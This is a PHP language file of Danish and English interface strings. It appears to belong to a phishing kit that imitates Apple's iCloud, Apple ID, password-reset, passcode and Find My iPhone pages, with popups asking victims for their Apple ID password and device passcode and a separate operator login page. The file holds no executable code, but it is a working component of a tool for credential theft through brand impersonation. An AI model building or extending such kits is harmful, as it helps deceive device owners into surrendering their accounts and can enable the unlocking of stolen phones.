<?php
/**
 * Created by PhpStorm.
 * User: mustapha
 * Date: 5/6/17
 * Time: 10:31 PM
 */

//- iCloud sign in page
$lang[ 'Singin_message' ] = "Sign in to iCloud";
$lang[ 'Setup_message' ] = "Indstillingsinstruktioner";
$lang[ 'Help_message' ] = "Help and Support";
$lang[ 'Password_message' ] = "Adgangskode";
$lang[ 'RePassword_message' ] = "Re-Password";
$lang[ 'NewRePassword_message' ] = "New Re-Password";
$lang[ 'incorrect_message' ] = 'Dit Apple-id eller din adgngskode er forket.';
$lang[ 'Keepsigin_message' ] = "Husk mig";
$lang[ 'Forgotpassword_message' ] = "Glemt Apple-id eller adgangskode?";
$lang[ 'Forgotpassword2_message' ] = "Forgot password?";
$lang[ 'DonthaveanAppleid_message' ] = "Don’t have an Apple ID?";
$lang[ 'Createyoursnow_message' ] = "Create yours now";
$lang[ 'Checkactivation_message' ] = "Check Activation Lock Status";
$lang[ 'Systemstatus_message' ] = "System Status";
$lang[ 'Privacy_message' ] = "Privacy Policy";
$lang[ 'Terms_message' ] = "Terms & Conditions";
$lang[ 'Copyrights_message' ] = 'Copyright © ' . date( 'Y' ) . ' Apple Inc. All rights reserved.';
$lang[ 'iCloudsettings_message' ] = "iCloud Settings";
$lang[ 'Signout_message' ] = "Log ud";
$lang[ 'VerificationFailed_message' ] = "Godkendelde mislykkedes";
$lang[ 'OK_message' ] = "OK";

//-- iCloud apps
$lang[ 'Reminders_message' ] = "Reminders";
$lang[ 'Notes_message' ] = "Notes";
$lang[ 'iCloudDrive_message' ] = "iCloud Drive";
$lang[ 'Photos_message' ] = "Photos";
$lang[ 'Contacts_message' ] = "Contacts";
$lang[ 'Mail_message' ] = "Mail";
$lang[ 'Settings_message' ] = "Settings";
$lang[ 'FindMyiPhone_message' ] = "Find min iPhone";
$lang[ 'Keynote_message' ] = "Keynote";
$lang[ 'Numbers_message' ] = "Numbers";
$lang[ 'FindFriends_message' ] = "Find Friends";
$lang[ 'Pages_message' ] = "Pages";

//- Maps connect Page
$lang[ 'Help_message' ] = "Help";
$lang[ 'Createone_message' ] = "Create one";
$lang[ 'ForgotIDorPassword_message' ] = "Forgot ID or Password?";

//- iTunes Connect Page
$lang[ 'iTunesConnect_message' ] = "iTunes Connect";
$lang[ 'Rememberme_message' ] = "Husk mig";

//- Apple ID Page
$lang[ 'SignIn_message' ] = "Log ind";
$lang[ 'CreateYourAppleID_message' ] = "Opret dit Apple‑id";
$lang[ 'FAQ_message' ] = "FAQ";
$lang[ 'ManageyourAppleaccount_message' ] = "Administrer din Apple-konto";
$lang[ 'YourAppleIDorpasswordwasincorrect_message' ] = "Dit Apple-id eller din adgngskode er forket";
$lang[ 'YouraccountforeverythingApple_message' ] = "Din konto til alt, der har med Apple at gøre";
$lang[ 'AsingleAppleIDandpasswordgivesyouaccesstoallAppleservices_message' ] = "Et enkelt Apple‑id og en adgangskode giver dig adgang til alle Apples tjenester.";
$lang[ 'LearnmoreaboutAppleID_message' ] = "Læs mere om Apple‑id";
$lang[ 'TermsofUse_message' ] = "Terms of Use";
$lang[ 'AppleOnlineStore_message' ] = "Apple Online Store";
$lang[ 'visitan_message' ] = "visit an";
$lang[ 'AppleRetailStore_message' ] = "Apple Retail Store";
$lang[ 'orfinda_message' ] = "or find a";
$lang[ 'reseller_message' ] = "reseller";
$lang[ 'Shopthe_message' ] = "Shop the";
$lang[ 'AppleInfo_message' ] = "Apple Info";
$lang[ 'SiteMap_message' ] = "Site Map";
$lang[ 'HotNews_message' ] = "Hot News";
$lang[ 'RSSFeeds_message' ] = "RSS Feeds";
$lang[ 'ContactUs_message' ] = "Contact Us";
$lang[ 'Search_message' ] = "Search";

//- Compass Page
$lang[ 'FindMyiPhone_message' ] = "Find min iPhone";
$lang[ 'Sign-InRequired_message' ] = "Du skal logge ind";
$lang[ 'Not_message' ] = "Er du ikke";


//- Reset Password Page
$lang[ 'ResetPassword_message' ] = "Reset Password";
$lang[ 'PasswordChanged_message' ] = "Password Changed";
$lang[ 'YourAppleIDpasswordfor_message' ] = "Your Apple ID password for";
$lang[ 'has_message' ] = "has";
$lang[ 'beenchanged_message' ] = "been changed";
$lang[ 'SignintoyourAppleIDaccountpagenowto_message' ] = "Sign in to your Apple ID account page now to";
$lang[ 'reviewyouraccountinformation_message' ] = "review your account information";
$lang[ 'GotoYourAccount_message' ] = "Go to Your Account";
$lang[ 'Enteranewpassword_message' ] = "Enter a new password";
$lang[ 'oldpassword_message' ] = "old password";
$lang[ 'newpassword_message' ] = "new password";
$lang[ 'confirmpassword_message' ] = "confirm password";
$lang[ 'Yourpasswordmusthave_message' ] = "Your password must have";
$lang[ 'ormorecharacters_message' ] = "8 or more characters";
$lang[ 'Upperlowercaseletters_message' ] = "Upper & lowercase letters";
$lang[ 'Atleastonenumber_message' ] = "At least one number";
$lang[ 'Strength_message' ] = "Strength";
$lang[ 'Avoidpasswordsthatareeasytoguessorusedwithotherwebsites_message' ] = "Avoid passwords that are easy to guess or used with other websites";
$lang[ 'YourAppleIDoroldpasswordwasincorrect_message' ] = "Your Apple ID or old password was incorrect";
$lang[ '_message' ] = "";
$lang[ '_message' ] = "";

//-- Login page
$lang[ 'Signsession_message' ] = "Sign in to start your session";
$lang[ 'Alert_message' ] = "Alert";
$lang[ 'Username_message' ] = "Username";
$lang[ 'Password_message' ] = "Adgangskode";
$lang[ 'Signin_message' ] = "Log ind";
$lang[ 'User_message' ] = "User";

//- General Lang
$lang[ 'appleid_message' ] = "Apple-id";
$lang[ 'Cancel_message' ] = "Cancel";
$lang[ 'required_message' ] = "Nødvendig";

//- Find my iphone page
$lang[ 'Alldevices_message' ] = "Alle enheder";
$lang[ 'Locating_message' ] = "Finder";
$lang[ 'Alldevicesoffline_message' ] = "Alle enheder er offline";
$lang[ 'Nolocations_message' ] = "Der vises ingen lokalteter, da alle dine enheder er offline.";
$lang[ 'hourago_message' ] = "1 hour ago";
$lang[ 'Playsound_message' ] = "Play Sound";
$lang[ 'Lostmode_message' ] = "Lost Mode";
$lang[ 'EraseiPhone_message' ] = "Erase iPhone";
$lang[ 'Notifyfound_message' ] = "Notify me when found";
$lang[ 'Removeaccount_message' ] = "Remove from Account";
$lang[ 'Offline_message' ] = "Offline";

//- Passcode Page
$lang['access'] = "Need to find your device? Get quick access to:";
$lang['enterpasscode'] = "Enter passcode to contiune.";

//- New Fmi Template
$lang['manageappleid'] = "Manage Apple ID";
$lang['No_Devices'] = "No Devices";
$lang['fmiSetup'] = "Set up your iCloud account on an iPhone, iPad, iPod touch or Mac to use Find My iPhone.";
$lang['MY_DEVICES'] = "MY DEVICES";
$lang['REFRESH'] = "REFRESH";
$lang['Seen_just_now'] = "Seen just now";
$lang['Old_Location'] = "Old Location";


//- FMI PopUp

$lang['Enter_the_password_Apple'] = "Enter the password for your Apple ID";
$lang['Apple_ID_Sign_Requested'] = "Apple ID Sign In Requested";
$lang['Turn_On_Send_Last_Location'] = "Turn On Send Last Location";
$lang['Allow_Find_My_iPhone_to_store_the_last'] = "Allow Find My iPhone to store the last known location of this iPhone for up to 24 hours after the battery has run out";
$lang['Not_Now'] = "Not Now";
$lang['Turn_On'] = "Turn On";
$lang['Your_Apple_ID_or_password_is_incorrect'] = "Your Apple ID or password is incorrect";
$lang['Action'] = "Action";
$lang['Updating_location'] = "Updating location";
$lang['Try_Again'] = "Try Again";